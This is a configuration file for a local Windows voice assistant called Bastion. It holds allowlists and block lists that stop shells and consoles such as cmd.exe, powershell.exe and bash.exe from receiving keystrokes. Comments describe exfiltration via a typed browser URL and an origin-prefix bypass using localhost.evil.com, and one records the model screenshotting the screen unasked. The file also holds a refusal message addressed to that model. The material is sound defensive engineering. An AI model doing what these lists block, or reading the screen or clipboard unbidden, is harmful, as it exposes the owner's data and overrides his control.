    (p for p in (_HOME / "AppData" / "Local" / "Discord").glob("app-*/Discord.exe")
     if _app_version(p)),
    key=_app_version,
    reverse=True,
)

ALLOWED_APPS: dict[str, str] = {
    "notepad":     "notepad.exe",
    "calculator":  "calc.exe",
    "explorer":    "explorer.exe",
    "edge":        r"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe",
    "chrome":      r"C:\Program Files\Google\Chrome\Application\chrome.exe",
    "spotify":     str(_HOME / "AppData" / "Roaming" / "Spotify" / "Spotify.exe"),
    "vscode":      str(_HOME / "AppData" / "Local" / "Programs" / "Microsoft VS Code" / "Code.exe"),
}

# Discord lives in a version-stamped folder; add it only if we found the exe.
if _discord:
    ALLOWED_APPS["discord"] = str(_discord[0])

# ─── Failure alerts (the one deliberate outbound call) ────────────────────────
# When Bastion itself breaks, alerts.py POSTs failure METADATA ONLY (component,
# exception class, short detail, timestamp) to a Discord webhook, so a dead
# assistant reports itself instead of going unnoticed. Everything else — LLM,
# STT, TTS, vision — remains fully local. Never send user content through this.
ALERTS_ENABLED = False   # optional crash alerts, off by default

# The webhook lives outside the repo and is read at runtime, never hardcoded.
ALERTS_ENV_PATH = _HOME / ".claude" / "channels" / "discord" / ".env"
ALERTS_ENV_KEY  = "ALERTS_WEBHOOK"

ALERT_TIMEOUT_S        = 5     # short — a hung POST must never stall Bastion
ALERT_DEDUPE_WINDOW_S  = 300   # 5 min: suppress repeats of the same component+error

# Discord only pushes to a phone for a channel set to "All Messages", or for a
# message that mentions you directly. An alert nobody is tagged in can therefore
# arrive silently — which defeats the entire point of alerting. Tagging the owner
# makes the push work regardless of how the channel is configured.
# Set to "" to disable the mention.
ALERT_MENTION_USER_ID = ""   # your Discord user id, optional

# ─── Weather ──────────────────────────────────────────────────────────────────
DEFAULT_LOCATION = "Springfield, IL"   # used when you don't specify a city

# ─── Persistence ──────────────────────────────────────────────────────────────
DATA_DIR = _HOME / ".bastion"
DB_PATH  = DATA_DIR / "memory.db"
LOG_PATH = DATA_DIR / "bastion.log"

# ─── Voice (Phase 2) ──────────────────────────────────────────────────────────
# Hotkey to activate listening. Change if it conflicts with another app.
HOTKEY = "<ctrl>+<alt>+j"

# Whisper model for speech-to-text (runs locally on CPU, no cloud).
# Options: tiny | base | small | medium  — larger = more accurate, slower.
# English-only models (.en) are markedly more accurate at English than the
# multilingual ones of the same size. "small.en" (~2s/clip on CPU) is a big
# accuracy jump over "base" with little speed cost. Bump to "medium.en" for even
# better accuracy if the CPU can spare it (slower).
WHISPER_MODEL_SIZE   = "small.en"
WHISPER_DEVICE       = "cpu"    # keep on CPU so GPU stays free for Ollama
WHISPER_COMPUTE_TYPE = "int8"   # int8 is optimal for CPU inference

# Preferred microphone — matched by name fragment (case-insensitive).
# Set to "" to use whatever Windows has as the default input device.
# "yeti" matches "Blue Yeti", "Yeti Stereo Microphone", etc.
AUDIO_DEVICE_NAME  = "yeti"

# Audio capture settings.
SAMPLE_RATE        = 16_000  # Hz — Whisper requires 16 kHz
SILENCE_THRESHOLD  = 0.015   # RMS amplitude; raise if background noise triggers early stop
SILENCE_DURATION_S = 1.5     # seconds of silence after speech before recording stops
MAX_RECORDING_S    = 30      # hard cap — prevents runaway recordings

# Text-to-speech: Piper (fully local, neural, runs on CPU — nothing leaves the PC).
# Voice model files live in ~/.bastion/piper_voices/.
# To switch voices, change PIPER_VOICE to another downloaded model's base name:
#   "BRIT_piper_1_alan"      — refined British male (Bastion-like)   [default]
#   "BRIT_piper_2_northern"  — British male, regional accent
#   "piper_1_ryan_high"      — US male, deep
#   "piper_3_lessac"         — US male, news-anchor
PIPER_VOICE     = "BRIT_piper_1_alan"
PIPER_VOICE_DIR = DATA_DIR / "piper_voices"

# Active TTS engine: "kokoro" (more natural local neural voice) or "piper".
# If Kokoro fails to load, voice.py automatically falls back to Piper.
TTS_ENGINE   = "kokoro"
# Kokoro voices (lang_code "b" = British English): bm_george, bm_lewis (British
# male); af_*/am_* are US voices. Speed ~1.1 gives a brisker, Bastion-like cadence.
KOKORO_VOICE = "bm_george"
KOKORO_LANG  = "b"
KOKORO_SPEED = 1.1

# Where Kokoro synthesises. "auto" = CUDA when torch reports a usable GPU, else
# CPU; "cpu" forces the CPU path. MEASURED on this box (RTX 4060, torch
# 2.12.1+cu130), warm, through voice.py on a real 306-char reply:
# 3141 ms CPU → 199 ms CUDA, ~15.7x. Costs +737 MiB resident / +941 MiB peak,
#
# *** These are FIRST-SENTENCE times, not whole-reply times. ***
# The phrase "on a real 306-char reply" above is the defect — the 3141 ms is the
# first ~92-char chunk of that reply, and it has been quoted ever since as if it
# were the cost of speaking the whole thing. Re-measured 2026-08-18
# (`bench_tts.py`, synthesis only, KOKORO_DEVICE="cpu" as shipped, bm_george at
# 1.1, first call discarded):
#     first sentence, 92 chars   median 3277 ms   (the 3141 above — a match)
#     54-char sentence                  2617 ms
#     whole 278-char reply              8318 ms
#     836-char reply                   23001 ms
#     fitted:  time_ms ≈ 1243 + 25.5 × chars
#
# Which figure applies depends entirely on the path: **streaming TTS only ever
# pays the first-sentence cost; the whole-reply fallback pays the big one.** That
# is most of why a turn where streaming silently fails feels so much worse.
#
# "199 ms CUDA" is presumably first-sentence too, so the ~15.7x ratio is probably
# sound — but it remains UNVERIFIED: re-testing needs ~941 MiB free and there was
# 1290 MiB, inside the eviction cliff PROTOCOL.md says not to walk into.
#
# and does NOT evict qwen — Kokoro lives in this process, not Ollama's
# (size_vram measured at 5900 MiB with and without Kokoro resident).
#
# There is only ~300 MiB of headroom at peak, so a game or a video can OOM
# Kokoro's own allocation. That is handled: a CUDA OOM degrades to CPU for the
# rest of the session rather than killing the voice. Set "cpu" here if you'd
# rather not gamble the VRAM at all.
#
# Grep bastion.log for `device cuda` on the "Kokoro voice loaded:" line before
# believing it is actually on the GPU.
# 2026-08-18: moved auto -> cpu. Every Ollama wedge observed had free VRAM near
# zero, and the clearest case had TWO processes each taking a CUDA context for
# Kokoro with 250 MiB free. Kokoro-on-CUDA is the newest variable and the prime
# suspect, so it gives up its ~740 MiB rather than the model. Costs ~2.9 s per
# synthesis (~3141-3277 ms CPU for the first sentence, which is what streaming
# TTS pays; 8318 ms for a whole 278-char reply on the fallback path — see the
# note above. The CUDA figure is unverified) — paid on first audio,
# and sentence-level streaming TTS hides most of it. Put back to "auto" if the
# wedges turn out to have another cause.
KOKORO_DEVICE = "cpu"

# ─── Sentence-level streaming TTS ────────────────────────────────────────────
# Speak sentence one while the rest of the reply is still being generated,
# instead of waiting for the whole reply. Measured first-audio on a 306-char
# reply (today's median): 14.68 s whole-reply → 2.78 s streaming, warm.
#
# voice.py reads these with getattr/_cfg and has working defaults for all of
# them, so nothing here changes behaviour — they live here because config.py is
# meant to be the one place the whole configuration can be audited.
#
# NOTE: streaming also requires bastion.chat() to accept an `on_content`
# callback. Until it does, voice._chat_supports_streaming() returns False and
# every turn falls back to whole-reply playback. Grep bastion.log for
# "Streaming TTS:" to see which path a turn actually took.
TTS_STREAMING = True

# Chunking. The first chunk is deliberately small so audio starts sooner; later
# chunks grow so the splitter stops interrupting mid-thought.
TTS_FIRST_CHUNK_CHARS = 120     # target size of chunk one
TTS_CHUNK_CHARS       = 240     # target size of steady-state chunks
TTS_MIN_CHUNK_CHARS   = 24      # below this, don't split on clause punctuation
TTS_MAX_BUFFER_CHARS  = 420     # force a split rather than buffering past this
TTS_CHUNK_GROWTH      = 1.8     # per-chunk size multiplier during the ramp
TTS_AUDIO_QUEUE       = 6       # synthesised chunks held ahead of playback

# Word-cut fallback: only cut mid-sentence while the reply is still short AND
# only for the first few chunks. The char guard alone barely gates anything —
# during the ramp the running length is under 100 almost by construction, which
# let a mid-word cut through at chunk 7 of 8.
TTS_WORD_CUT_BELOW_CHARS = 100
TTS_WORD_CUT_MAX_CHUNKS  = 3

# Proactive spoken briefing when Bastion starts up (greeting + time + weather +
# status). Pairs with the remote wake-on-LAN boot so Bastion greets you when you
# sit down. Set False to start silently.
STARTUP_BRIEFING = True

# Wake word: say "Bastion" to activate, hands-free. Always-on LOCAL listening —
# audio is processed on-device (openWakeWord) and never leaves the PC. The
# Ctrl+Alt+J hotkey still works as a backup. Set WAKEWORD_ENABLED = False to go
# back to hotkey-only. Raise the threshold if it self-triggers, lower if it misses.
WAKEWORD_ENABLED   = True
WAKEWORD_THRESHOLD = 0.5

# ─── Barge-in: talking over Bastion while he is speaking ──────────────────────
# These were live as `_cfg` defaults inside voice.py and nowhere else, so
# `grep BARGE_IN config.py` found nothing and they were effectively unfindable.
# Surfacing them here is the convention: config.py is the single place to audit.
#
# Barge-in was BROKEN until 2026-08-18 and the cause was not the threshold.
# `stop_speaking()` worked fine; nothing ever called it, because the whole-reply
# playback fallbacks cleared the "speaking" flag BEFORE playing, so both the
# hotkey and the wake word believed nothing was playing. the owner's report was
# "i cant interrupt it really" and he was exactly right.
BARGE_IN_ENABLED   = True
BARGE_IN_THRESHOLD = 0.6   # higher than WAKEWORD_THRESHOLD: a false positive
                           # here cuts him off mid-sentence, so it is stricter
BARGE_IN_GUARD_S   = 0.7   # ignore the first moment of playback, or Bastion's
                           # own first syllable can trigger it

# ─── Wait acknowledgement: "One moment, sir." ────────────────────────────────
# A tool-heavy turn measured 105.8 seconds to first audio on 2026-08-18, during
# which Bastion said nothing at all. Silence is indistinguishable from a crash —
# the owner reported that turn as "taking forever", and a 28-second one that ended
# in an empty reply as the assistant being broken.
#
# There is a second, less obvious reason this matters: barge-in only works while
# Bastion is speaking. A completely silent turn cannot be interrupted at all, so
# the ack is also what gives him a way to stop a long turn.
#
# Set WAIT_ACK_ENABLED = False if the interjections turn out to be more annoying
# than the silence they replace — that is a matter of taste and the owner's call.
WAIT_ACK_ENABLED  = True
# 4.0, not 6.0. Kokoro on CPU takes 2617 ms to synthesise a 54-char sentence
# (measured 2026-08-18, bench_tts.py), so a 6 s trigger puts the first actual
# SOUND at ~8.6 s — by which point the owner has already decided it is broken.
# Cost, stated honestly: the ack shares the single synth worker with the reply,
# so a turn that acks can see its first real sentence queue behind up to ~2.6 s
# of ack synthesis.
#
# This value lives here and voice.py's `_cfg` default is only a fallback — so
# setting it here OVERRIDES that default. It briefly did exactly that today:
# config said 6.0 while voice.py had been retuned to 4.0, and config silently won.
WAIT_ACK_AFTER_S  = 4.0    # first ack once a turn has gone this long in silence
WAIT_ACK_REPEAT_S = 25.0   # and again on this interval
WAIT_ACK_MAX      = 3      # never more than this many in one turn
WAIT_ACK_PHRASES  = (
    "One moment, sir.",
    "Still working on it, sir.",
    "Nearly there, sir.",
)

# Screen vision (Sight): a local model reads the screen ONLY when you ask
# ("look at my screen" / "what's this error"). Never continuous, no webcam.
# VISION_MONITOR: "primary" picks the primary screen; failing that, the first
# landscape one; failing that, the first screen at all. Or set an mss monitor
# index. As of 2026-08-20 there are two displays and BOTH are landscape: the
# ASUS TUF VG24V at 1920x1080/144 (primary, the work screen) and a 32" TCL over
# HDMI at 1920x1080/60. "primary" resolves to the ASUS on the first branch —
# traced live — which is the right answer: "look at my screen" should read what
# the owner is working on, not the television.
#
# The landscape-preference fallback under it no longer discriminates, because
# nothing here is portrait any more. It used to exist to avoid screenshotting
# the vertical HUD panel. Left in place: it costs nothing and becomes correct
# again the moment a portrait screen reappears. If the TV ever needs reading
# deliberately, set VISION_MONITOR = 2 rather than touching the fallback.
VISION_MODEL   = "moondream"
VISION_MONITOR = "primary"
VISION_MAX_WIDTH = 1280   # downscale screenshots to this width before the VLM

# "ONLY when you ask" above was a comment, not a rule — nothing enforced it, and
# on 2026-08-18 the model screenshotted the screen and OCR'd 2,707 characters of
# it in the middle of "turn on <track> on Spotify", three separate times. The
# tool description only ever SUGGESTED when to look; an 8B model treats a
# suggestion as a hint. This makes the documented behaviour real: look_at_screen
# refuses unless the user's own words asked for it.
#
# The gate is a keyword test on the raw utterance, so it is deliberately
# GENEROUS — a wrongly-allowed look costs ~30 s, a wrongly-refused one costs a
# feature. Any of these patterns matching anywhere in what the user said is
# enough. Add a phrase here if Bastion refuses something it should have looked at.
VISION_REQUIRE_EXPLICIT_REQUEST = True
VISION_REQUEST_PATTERNS = (
    # The screen named directly.
    r"\b(screen|screens|monitor|monitors|display|displays|desktop|"
    r"screenshot|screen ?grab|screen ?cap\w*|wallpaper)\b",
    # Any verb of looking or reading.
    r"\b(look|looks|looking|looked|see|sees|seeing|seen|watch|watches|watching|"
    r"read|reads|reading|view|views|viewing|glance|glancing|peek|peeking|"
    r"describe|describing|ocr)\b",
    # Asking about something present without a verb of looking.
    r"\b(show me|in front of me|on my (screen|pc|computer|desktop))\b",
    r"\bwhat(?:'?s| is| does| do you)?\s+(this|that)\b",
    r"\b(this|that) (error|message|dialog|dialogue|window|popup|pop-up|page|"
    r"code|text|line|thing)\b",
)
# What the model is handed when it looks unbidden. It is an instruction to the
# MODEL, not something spoken to the owner, so it says what to do instead.
VISION_UNREQUESTED_MESSAGE = (
    "REFUSED: you may not look at the screen unless the user asked you to. "
    "Nothing in what they just said referred to the screen or to looking, "
    "reading or seeing anything, so no screenshot was taken. Answer using the "
    "other tools, or ask them what they want you to look at."
)

# Hands (PC control): lets Bastion type text and run a curated allowlist of safe
# keyboard shortcuts (switch window, snap, save, copy/paste, scroll, etc.). No
# arbitrary key combos, no clicking, no run-dialog. Set False to disable entirely.
HANDS_ENABLED = True

# ─── Clipboard ────────────────────────────────────────────────────────────────
# Whether Bastion may READ the clipboard. Off by default: whatever you last
# copied is often a password-manager paste, a 2FA code or a private message, and
# the model can forward anything it reads to any outbound tool in the same turn.
# Writing to the clipboard stays available regardless of this setting.
# Turn this on only while you actually want "summarise what I copied", and be
# aware it makes the clipboard readable by the model for as long as it is True.
#
# Even with it True, EVERY read also asks the owner out of band (a Win32 message box
# he has to click) before a single character reaches the model — the flag is the
# standing permission, the prompt is the per-use one. Reads are additionally
# gated by HANDS_ENABLED, and so is writing.
CLIPBOARD_READ_ENABLED = False

# How long the clipboard-read confirmation box waits for an answer before giving
# up. It has to expire: the box is shown from the turn's own thread, so without
# a timeout an unattended machine would hang Bastion until someone clicked it.
# Timing out counts as NO. Long enough to walk back to the desk, short enough
# that a voice turn doesn't feel dead.
CLIPBOARD_CONFIRM_TIMEOUT_S = 45

# ─── Hands: foreground-window gate ────────────────────────────────────────────
# Keystrokes land in whatever window happens to be focused, so the target window
# is part of the security policy. Before type_text or press_keys sends anything,
# security.safe_foreground_window() resolves the foreground window and refuses
# unless it passes the checks below. It FAILS CLOSED: if the window can't be
# identified for any reason, the keystrokes are refused.
#
# Which process may receive keystrokes. Lowercase .exe basenames, exact match.
# Deliberately tiny — adding an entry is a security decision. What each common
# candidate would hand the model if you added it:
#   chrome.exe / msedge.exe  — the omnibox: a typed URL exfiltrates data using
#                              your real logged-in browser session. (finding 5)
#   code.exe                 — an editor that can run tasks and open a terminal.
#   discord.exe              — sends messages as you, including into #alerts.
#   explorer.exe             — the address bar launches programs.
# Consoles and dialogs are refused even if listed here (see the two sets below).
HANDS_ALLOWED_WINDOWS: frozenset[str] = frozenset({
    "notepad.exe",
})

# Refused regardless of the allowlist — a keystroke here is a command or an
# irreversible confirmation. Matched as a case-insensitive substring of the
# Win32 window class name.
#   #32770 is THE Win32 dialog class: Save As, Open, and every confirm box, so
#   a stray Enter or Ctrl+S can't commit a file write.
HANDS_BLOCKED_WINDOW_CLASSES: frozenset[str] = frozenset({
    "#32770",                          # Win32 dialog (save/open/confirm)
    "consolewindowclass",              # cmd.exe / conhost
    "cascadia_hosting_window_class",   # Windows Terminal
    "virtualconsoleclass",             # ConEmu / Cmder
    "mintty",                          # Git Bash
    "putty",                           # PuTTY
    "credential dialog xaml host",     # Windows credential prompt
})

# Refused regardless of the allowlist, by process name — covers a console whose
# window class we don't recognise. Lowercase .exe basenames, exact match.
HANDS_BLOCKED_PROCESSES: frozenset[str] = frozenset({
    "cmd.exe", "powershell.exe", "pwsh.exe", "conhost.exe",
    "windowsterminal.exe", "wt.exe", "openconsole.exe",
    "mintty.exe", "bash.exe", "sh.exe", "putty.exe",
    "python.exe", "pythonw.exe", "py.exe",
})

# ─── HUD WebSocket auth ───────────────────────────────────────────────────────
# The HUD socket (ws://127.0.0.1:8765) streams transcripts and live reasoning.
# Loopback binding alone does NOT protect it: WebSockets are exempt from the
# same-origin policy, so any web page could otherwise open it and read the whole
# conversation. Two fail-closed checks guard it, both in hud_server.py.
#
# 1. Shared secret. The client must send {"type":"auth","token":HUD_TOKEN} as its
#    first frame or it is closed with code 4401 having received nothing. This is
#    a defence against a *web page* — a site can open a loopback socket but can
#    never read a local file, so it can't learn this value. It is NOT a defence
#    against another local process, which can read the token file.
#    The token is generated per install (never shipped in the source) and kept
#    in ~/.bastion/hud_token. Open the HUD as wallpaper/index.html#token=<token>;
#    hud_server logs that exact URL at start-up.
def _hud_token() -> str:
    import os
    import secrets
    given = os.environ.get("BASTION_HUD_TOKEN", "").strip()
    if given:
        return given
    path = Path.home() / ".bastion" / "hud_token"
    try:
        saved = path.read_text(encoding="utf-8").strip()
        if saved:
            return saved
    except OSError:
        pass
    token = secrets.token_hex(16)
    try:
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(token, encoding="utf-8")
    except OSError:
        pass                     # still works for this run; a new one next time
    return token


HUD_TOKEN = _hud_token()

# 2. Origin, checked at the handshake before a socket is even established.
#    The wallpaper is a local file:// page in Lively's Chromium host; browsers
#    send "null" or "file://" for those, and some hosts send no Origin at all
#    (hence None). Every real website is refused with 403. Widening this is a
#    security decision — an allowed origin still needs the token, but don't add
#    an entry casually.
#    Matched EXACTLY, never by prefix: "http://localhost".startswith() also
#    matches http://localhost.evil.com, an attacker-controlled domain. Verified
#    live — a prefix version of this list accepted exactly that origin.
#    "localfolder://index.html" is what CURRENT Lively sends. Older builds sent
#    "null"; newer ones serve the wallpaper over a custom localfolder scheme,
#    and the Origin then carries the FILE NAME. Added 2026-08-17 after the HUD
#    sat dark refusing every connect with 403 — Bastion was running perfectly and
#    the wallpaper was being turned away at the door.
#    Safe: a web page cannot forge an Origin header (the browser sets it), no
#    site can claim a localfolder scheme, the token is still required, and the
#    server is bound to loopback. Both wallpapers are named index.html so one
#    entry covers the vertical and horizontal HUDs.
HUD_ALLOWED_ORIGINS: frozenset = frozenset({None, "", "null", "file://",
                                            "localfolder://index.html"})

# Loopback http(s)-less origins are allowed in case the HUD is ever served
# locally instead of loaded from disk. The scheme must be http and the HOST must
# equal one of these entries exactly; any port is fine. Parsed, not prefixed.
HUD_ALLOWED_ORIGIN_HOSTS: frozenset = frozenset({"127.0.0.1", "localhost", "[::1]", "::1"})

# How long a connected client has to send its auth frame before being closed.
HUD_AUTH_TIMEOUT_S = 5.0

# ─── Roku TV control (local ECP, port 8060) ──────────────────────────────────
# Allowlist of devices Bastion may control, keyed by SERIAL NUMBER only. DHCP
# moves IPs and the Roku app lets anyone rename a device, so neither is an
# identity — and other people's televisions answer on this same subnet. the owner
# confirmed these two serials himself; guesses from device labels have been
# wrong three separate times, so do not "correct" this list from a room name.
#
# Purely local: plain HTTP to a private IPv4 address, no account, no token, no
# cloud, works with the internet down. tools.py checks every target is a
# private, non-loopback, non-link-local address before opening a socket.
#
# tools.py reads this with getattr and FAILS CLOSED — with no allowlist every
# action refuses, so nothing is controllable that isn't named here.
ROKU_DEVICES: dict[str, dict] = {
    # serial number (from the Roku's /query/device-info) -> spoken names
    "YOUR-ROKU-SERIAL": {"name": "the living room TV",
                         "aliases": ("living room", "tv")},
}
# Names are lowercase-leading on purpose ("turn on the 32-inch TV"); the tool
# sentence-cases them when they start a reply.

ROKU_PORT = 8060
ROKU_DISCOVERY_TIMEOUT_S = 3.0
ROKU_REQUEST_TIMEOUT_S = 4.0
ROKU_CACHE_TTL_S = 300

# Switching a track while Spotify is ALREADY open used to press Home first,
# which closes the app — the owner's words on 2026-08-18: "it literally closes the
# app and reloads back in with what i asked". The Home press exists for a
# measured reason (a deep link into an already-foreground app was ignored once),
# so it has not been removed: when Spotify is already the active app, tools.py
# now sends the search deep link IN PLACE first and only falls back to the old
# Home-and-relaunch path if the set doesn't switch within this window. Worst
# case is therefore exactly today's behaviour, plus this many seconds.
ROKU_SPOTIFY_INPLACE_S = 14.0
